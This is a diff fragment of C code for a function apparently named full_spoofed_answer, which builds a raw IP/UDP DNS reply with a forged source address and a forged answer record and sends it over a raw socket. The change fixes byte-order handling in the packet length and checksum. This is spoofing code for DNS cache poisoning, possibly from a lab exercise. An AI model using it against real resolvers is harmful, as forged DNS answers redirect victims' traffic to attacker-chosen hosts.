@@ -99,7 +99,7 @@ int full_spoofed_answer(uint txid, uint d_port) {
     iph->saddr = inet_addr("192.168.1.207"); // Source IP
     iph->daddr = dest.sin_addr.s_addr;
     iph->check = 0; // Will calculate later
-    printf("iph->tot_len: %d\n", iph->tot_len);
+    printf("iph->tot_len: %d\n", ntohs(iph->tot_len));
     // Fill in the UDP header
     udph->source = htons(DNS_PORT);
     udph->dest = dest.sin_port;
@@ -131,7 +131,7 @@ int full_spoofed_answer(uint txid, uint d_port) {
     ans->rdata = inet_addr(resolved_ip);
     printf("got here entring the checksum\n");
     // Calculate IP checksum
-    iph->check = checksum((unsigned short *)buffer, iph->tot_len);
+    iph->check = checksum((unsigned short *)buffer, ntohs(iph->tot_len));
     printf("got here exit the checksum\n");
     // Create socket
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
